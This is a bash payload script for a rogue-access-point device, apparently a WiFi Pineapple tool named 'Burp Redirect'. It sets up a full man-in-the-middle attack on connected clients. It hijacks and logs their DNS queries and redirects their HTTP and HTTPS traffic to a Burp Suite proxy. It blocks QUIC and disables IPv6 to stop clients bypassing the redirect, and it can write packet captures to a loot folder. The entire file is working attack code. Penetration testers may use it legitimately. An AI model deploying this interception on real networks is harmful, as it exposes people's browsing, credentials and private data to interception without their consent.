#!/bin/bash
# Title: Burp Redirect
# Description: Redirect client traffic to Burp Suite proxy (full or passive mode)
# Author: Janek
# Version: 2.0
# Category: Interception

PAYLOAD_NAME="burp_redirect"
BRIDGE_MASTER="br-lan"
PORTAL_IP="172.16.52.1"
EVIL_BRIDGE="br-evil"
EVIL_ZONE="evil"

LED SETUP

resp=$(CONFIRMATION_DIALOG "Route Evil AP client traffic through Burp Suite?")
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        LED OFF
        exit 1
        ;;
esac
if [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    LOG "Aborted."
    LED OFF
    exit 0
fi

# ============================================================
# Mode selection
# ============================================================
LOG cyan "===== SELECT MODE ====="
LOG ""
LOG "  A = Full Interception"
LOG "      HTTP + HTTPS DNAT to Burp"
LOG "      Burp CA cert required on clients"
LOG ""
LOG "  B = Passive Recon"
LOG "      DNS logging + HTTP-only DNAT"
LOG "      No cert needed, HTTPS passes through"
LOG ""
LOG "Press A or B"

MODE=""
while [ -z "$MODE" ]; do
    btn=$(WAIT_FOR_INPUT)
    case "$btn" in
        A) MODE="full" ;;
        B) MODE="passive" ;;
    esac
done

PAYLOAD_SET_CONFIG "$PAYLOAD_NAME" "mode" "$MODE"

if [ "$MODE" = "full" ]; then
    LOG green "Selected: Full Interception"
else
    LOG green "Selected: Passive Recon"
fi

# ============================================================
# Burp IP & port
# ============================================================
saved_ip=$(PAYLOAD_GET_CONFIG "$PAYLOAD_NAME" "burp_ip")
[ -z "$saved_ip" ] && saved_ip="192.168.1.100"

BURP_IP=$(IP_PICKER "Burp Suite IP address" "$saved_ip")
case $? in
    $DUCKYSCRIPT_CANCELLED) LOG red "Cancelled"; LED OFF; exit 1 ;;
    $DUCKYSCRIPT_REJECTED)  LOG red "Rejected";  LED OFF; exit 1 ;;
    $DUCKYSCRIPT_ERROR)     LOG red "Error";     LED OFF; exit 1 ;;
esac
PAYLOAD_SET_CONFIG "$PAYLOAD_NAME" "burp_ip" "$BURP_IP"

saved_port=$(PAYLOAD_GET_CONFIG "$PAYLOAD_NAME" "burp_port")
[ -z "$saved_port" ] && saved_port="8080"

BURP_PORT=$(NUMBER_PICKER "Burp Suite proxy port" "$saved_port")
case $? in
    $DUCKYSCRIPT_CANCELLED) LOG red "Cancelled"; LED OFF; exit 1 ;;
    $DUCKYSCRIPT_REJECTED)  LOG red "Rejected";  LED OFF; exit 1 ;;
    $DUCKYSCRIPT_ERROR)     LOG red "Error";     LED OFF; exit 1 ;;
esac
PAYLOAD_SET_CONFIG "$PAYLOAD_NAME" "burp_port" "$BURP_PORT"

LOG cyan "Target: $BURP_IP:$BURP_PORT"

LED ATTACK

# ============================================================
# DNS hijacking (both modes)
# ============================================================
LOG "Starting DNS hijacking..."

if [ -f /tmp/burp_redirect-dns.pid ]; then
    OLD_PID=$(cat /tmp/burp_redirect-dns.pid)
    kill -0 $OLD_PID 2>/dev/null && kill $OLD_PID 2>/dev/null
fi

for PID_1053 in $(netstat -plant 2>/dev/null | grep ':1053' | awk '{print $NF}' | sed 's/\/.*//g' | sort -u); do
    kill $PID_1053 2>/dev/null && LOG "  Killed leftover on port 1053 (PID: $PID_1053)"
done

for i in 1 2 3 4 5; do
    netstat -plant 2>/dev/null | grep -q ':1053' || break
    sleep 1
done
if netstat -plant 2>/dev/null | grep -q ':1053'; then
    LOG red "Port 1053 still in use"
    LED FAIL
    exit 1
fi

dnsmasq -k --no-hosts --no-resolv \
    --server=8.8.8.8 --server=8.8.4.4 \
    --log-queries --log-facility=/tmp/burp_redirect_dns.log \
    -p 1053 --listen-address="$PORTAL_IP" --bind-interfaces &
DNS_PID=$!
echo "$DNS_PID" > /tmp/burp_redirect-dns.pid
sleep 1

if kill -0 $DNS_PID 2>/dev/null; then
    LOG green "DNS hijacking active (PID: $DNS_PID)"
else
    LOG red "dnsmasq failed to start"
    LED FAIL
    exit 1
fi

# ============================================================
# Remove ALL existing BurpRedirect rules (idempotent re-run)
# ============================================================
LOG "Cleaning old BurpRedirect rules..."
CLEANED=0
while uci show firewall 2>/dev/null | grep -q "BurpRedirect"; do
    LAST_IDX=""
    for section in $(uci show firewall | grep "@redirect\[" | cut -d'.' -f2 | cut -d'=' -f1 | sort -u); do
        rule_name=$(uci get firewall.$section.name 2>/dev/null)
        if echo "$rule_name" | grep -qi "burpredirect"; then
            idx=$(echo "$section" | sed 's/@redirect\[\([0-9]*\)\].*/\1/')
            if [ -n "$idx" ]; then
                if [ -z "$LAST_IDX" ] || [ "$idx" -gt "$LAST_IDX" ]; then
                    LAST_IDX="$idx"
                fi
            fi
        fi
    done
    [ -z "$LAST_IDX" ] && break
    uci delete firewall.@redirect[$LAST_IDX] 2>/dev/null
    CLEANED=$((CLEANED + 1))
done
[ "$CLEANED" -gt 0 ] && LOG "  Removed $CLEANED old rule(s)"

# ============================================================
# Remove conflicting redirect rules (e.g. GoodPortal)
# ============================================================
CONFLICTING=$(uci show firewall 2>/dev/null | grep "@redirect\[" | grep -i "name=" | grep -iv "BurpRedirect" | grep -i "src_dport=\|dest_port=" || true)
if [ -n "$CONFLICTING" ]; then
    LOG yellow "Removing conflicting redirect rules..."
    while true; do
        LAST_IDX=""
        LAST_NAME=""
        for section in $(uci show firewall | grep "@redirect\[" | cut -d'.' -f2 | cut -d'=' -f1 | sort -u); do
            rule_name=$(uci get firewall.$section.name 2>/dev/null)
            if [ -n "$rule_name" ] && ! echo "$rule_name" | grep -qi "burpredirect"; then
                idx=$(echo "$section" | sed 's/@redirect\[\([0-9]*\)\].*/\1/')
                if [ -n "$idx" ]; then
                    if [ -z "$LAST_IDX" ] || [ "$idx" -gt "$LAST_IDX" ]; then
                        LAST_IDX="$idx"
                        LAST_NAME="$rule_name"
                    fi
                fi
            fi
        done
        [ -z "$LAST_IDX" ] && break
        uci delete firewall.@redirect[$LAST_IDX] 2>/dev/null
        LOG "  Removed: $LAST_NAME"
    done
    uci commit firewall
fi

# ============================================================
# Firewall redirect rules (UCI)
# ============================================================
LOG "Configuring firewall rules..."

# HTTP -> Burp (both modes)
uci add firewall redirect
uci set firewall.@redirect[-1].name='BurpRedirect HTTP'
uci set firewall.@redirect[-1].src="$EVIL_ZONE"
uci set firewall.@redirect[-1].dest='wan'
uci set firewall.@redirect[-1].proto='tcp'
uci set firewall.@redirect[-1].src_dport='80'
uci set firewall.@redirect[-1].dest_ip="$BURP_IP"
uci set firewall.@redirect[-1].dest_port="$BURP_PORT"
uci set firewall.@redirect[-1].target='DNAT'
uci set firewall.@redirect[-1].enabled='1'
LOG "  HTTP -> $BURP_IP:$BURP_PORT"

# HTTPS -> Burp (full mode only)
if [ "$MODE" = "full" ]; then
    uci add firewall redirect
    uci set firewall.@redirect[-1].name='BurpRedirect HTTPS'
    uci set firewall.@redirect[-1].src="$EVIL_ZONE"
    uci set firewall.@redirect[-1].dest='wan'
    uci set firewall.@redirect[-1].proto='tcp'
    uci set firewall.@redirect[-1].src_dport='443'
    uci set firewall.@redirect[-1].dest_ip="$BURP_IP"
    uci set firewall.@redirect[-1].dest_port="$BURP_PORT"
    uci set firewall.@redirect[-1].target='DNAT'
    uci set firewall.@redirect[-1].enabled='1'
    LOG "  HTTPS -> $BURP_IP:$BURP_PORT"
fi

# DNS TCP -> local dnsmasq (both modes)
uci add firewall redirect
uci set firewall.@redirect[-1].name='BurpRedirect DNS TCP'
uci set firewall.@redirect[-1].src="$EVIL_ZONE"
uci set firewall.@redirect[-1].dest='lan'
uci set firewall.@redirect[-1].proto='tcp'
uci set firewall.@redirect[-1].src_dport='53'
uci set firewall.@redirect[-1].dest_ip="$PORTAL_IP"
uci set firewall.@redirect[-1].dest_port='1053'
uci set firewall.@redirect[-1].target='DNAT'
uci set firewall.@redirect[-1].enabled='1'
LOG "  DNS TCP -> $PORTAL_IP:1053"

# DNS UDP -> local dnsmasq (both modes)
uci add firewall redirect
uci set firewall.@redirect[-1].name='BurpRedirect DNS UDP'
uci set firewall.@redirect[-1].src="$EVIL_ZONE"
uci set firewall.@redirect[-1].dest='lan'
uci set firewall.@redirect[-1].proto='udp'
uci set firewall.@redirect[-1].src_dport='53'
uci set firewall.@redirect[-1].dest_ip="$PORTAL_IP"
uci set firewall.@redirect[-1].dest_port='1053'
uci set firewall.@redirect[-1].target='DNAT'
uci set firewall.@redirect[-1].enabled='1'
LOG "  DNS UDP -> $PORTAL_IP:1053"

uci commit firewall

LOG "Restarting firewall..."
/etc/init.d/firewall restart
FW_RC=$?
if [ $FW_RC -eq 0 ]; then
    LOG green "Firewall restarted"
else
    LOG red "Firewall restart failed (exit code $FW_RC)"
fi

# ============================================================
# Block QUIC (UDP 443) to force TCP fallback
# ============================================================
LOG "Blocking QUIC (UDP 443)..."
nft insert rule inet fw4 forward_evil udp dport 443 counter drop 2>/dev/null
if [ $? -eq 0 ]; then
    LOG green "QUIC blocked"
else
    LOG yellow "Could not block QUIC (forward_evil chain may not exist yet)"
fi

# ============================================================
# IPv6 disable (prevents bypass)
# ============================================================
LOG "Disabling IPv6..."
sysctl -w net.ipv6.conf.${BRIDGE_MASTER}.disable_ipv6=1 2>/dev/null || true
sysctl -w net.ipv6.conf.${EVIL_BRIDGE}.disable_ipv6=1 2>/dev/null || true
LOG green "IPv6 disabled"

# ============================================================
# IP forwarding
# ============================================================
echo 1 > /proc/sys/net/ipv4/ip_forward

# ============================================================
# Passive mode: optional pcap capture
# ============================================================
if [ "$MODE" = "passive" ]; then
    resp=$(CONFIRMATION_DIALOG "Start packet capture (pcap) for Wireshark analysis?")
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR) ;;
        *)
            if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
                LOOTDIR="/root/loot/burp_redirect"
                mkdir -p "$LOOTDIR"
                PCAP_FILE="$LOOTDIR/capture_$(date +%Y%m%d_%H%M%S).pcap"
                tcpdump -i "$EVIL_BRIDGE" -w "$PCAP_FILE" -n not port 22 &
                PCAP_PID=$!
                echo "$PCAP_PID" > /tmp/burp_redirect-pcap.pid
                PAYLOAD_SET_CONFIG "$PAYLOAD_NAME" "pcap_file" "$PCAP_FILE"
                LOG green "Packet capture: $PCAP_FILE"
            fi
            ;;
    esac
fi

# ============================================================
# Client whitelisting
# ============================================================
WHITELIST_FILE="/tmp/burp_whitelist.txt"
touch "$WHITELIST_FILE"

whitelist_ip() {
    local IP="$1"
    nft insert rule inet fw4 dstnat_evil ip saddr "$IP" tcp dport 80 counter accept 2>/dev/null
    nft insert rule inet fw4 dstnat_evil ip saddr "$IP" tcp dport 443 counter accept 2>/dev/null
    nft insert rule inet fw4 dstnat_evil ip saddr "$IP" tcp dport 53 counter accept 2>/dev/null
    nft insert rule inet fw4 dstnat_evil ip saddr "$IP" udp dport 53 counter accept 2>/dev/null
    nft insert rule inet fw4 forward_evil ip saddr "$IP" counter accept 2>/dev/null
    echo "$IP" >> "$WHITELIST_FILE"
    LOG green "Whitelisted: $IP"
}

resp=$(CONFIRMATION_DIALOG "Whitelist any client IPs? (bypass redirect)")
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR) ;;
    *)
        if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
            while true; do
                WL_IP=$(IP_PICKER "Client IP to whitelist" "10.0.0.100")
                case $? in
                    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR) break ;;
                esac
                whitelist_ip "$WL_IP"

                resp2=$(CONFIRMATION_DIALOG "Whitelist another IP?")
                case $? in
                    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR) break ;;
                esac
                [ "$resp2" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && break
            done
        fi
        ;;
esac

# ============================================================
# Verification
# ============================================================
LOG "Verifying..."
ERRORS=0

if netstat -plant 2>/dev/null | grep -q ':1053'; then
    LOG green "DNS: listening on port 1053"
else
    LOG red "DNS: NOT listening on port 1053"
    ERRORS=$((ERRORS + 1))
fi

TEST_RESULT=$(nslookup -port=1053 google.com "$PORTAL_IP" 2>&1 | grep "^Address:" | grep -v "$PORTAL_IP" | head -1 | awk '{print $2}')
if [ -n "$TEST_RESULT" ] && [ "$TEST_RESULT" != "0.0.0.0" ]; then
    LOG green "DNS: google.com -> $TEST_RESULT"
else
    LOG red "DNS: resolution failed"
    ERRORS=$((ERRORS + 1))
fi

EXPECTED_RULES=3
[ "$MODE" = "full" ] && EXPECTED_RULES=4
RULE_COUNT=$(uci show firewall | grep -c "BurpRedirect" || true)
if [ "$RULE_COUNT" -ge "$EXPECTED_RULES" ]; then
    LOG green "UCI: $RULE_COUNT BurpRedirect rules"
else
    LOG red "UCI: expected $EXPECTED_RULES, found $RULE_COUNT"
    ERRORS=$((ERRORS + 1))
fi

if nft list chain inet fw4 dstnat_evil >/dev/null 2>&1; then
    DNAT_COUNT=$(nft list chain inet fw4 dstnat_evil 2>/dev/null | grep -c "dnat")
    LOG green "nftables: $DNAT_COUNT DNAT rules in dstnat_evil"
else
    LOG red "nftables: dstnat_evil chain does not exist!"
    LOG red "  Firewall did not generate DNAT chain for evil zone."
    LOG red "  Check: uci show firewall | grep redirect"
    ERRORS=$((ERRORS + 1))
fi

WL_COUNT=0
[ -f "$WHITELIST_FILE" ] && WL_COUNT=$(wc -l < "$WHITELIST_FILE" | tr -d ' ')
[ "$WL_COUNT" -gt 0 ] && LOG "Whitelisted clients: $WL_COUNT"

if [ "$ERRORS" -gt 0 ]; then
    LED FAIL
    LOG red "$ERRORS verification error(s)"
    PROMPT "Press any button to exit"
    exit 1
fi

LED FINISH
RINGTONE "success"

LOG "========================================"
LOG green "Burp Redirect Active!"
LOG "========================================"
LOG ""
if [ "$MODE" = "full" ]; then
    LOG cyan "Mode: Full Interception"
    LOG "  HTTP + HTTPS -> $BURP_IP:$BURP_PORT"
    LOG ""
    LOG yellow "Clients need Burp CA cert installed!"
    LOG "  Export: Burp > Proxy > Proxy settings > CA cert"
    LOG "  Serve:  python3 -m http.server 8888"
    LOG "  Client: http://$BURP_IP:8888/burp-ca.der"
else
    LOG cyan "Mode: Passive Recon"
    LOG "  HTTP -> $BURP_IP:$BURP_PORT"
    LOG "  HTTPS passes through normally"
    LOG "  QUIC blocked (forces TCP fallback)"
fi
LOG ""
LOG "DNS log: /tmp/burp_redirect_dns.log"
if [ -f /tmp/burp_redirect-pcap.pid ]; then
    LOG "Pcap:    $(PAYLOAD_GET_CONFIG "$PAYLOAD_NAME" "pcap_file")"
fi
LOG ""
LOG cyan "Burp setup:"
LOG "  1. Listener on $BURP_PORT, bind All Interfaces"
LOG "  2. Enable 'Support invisible proxying'"
LOG ""
LOG yellow "Run 'Burp Redirect Remove' to restore"

PROMPT "Press any button to exit"
exit 0
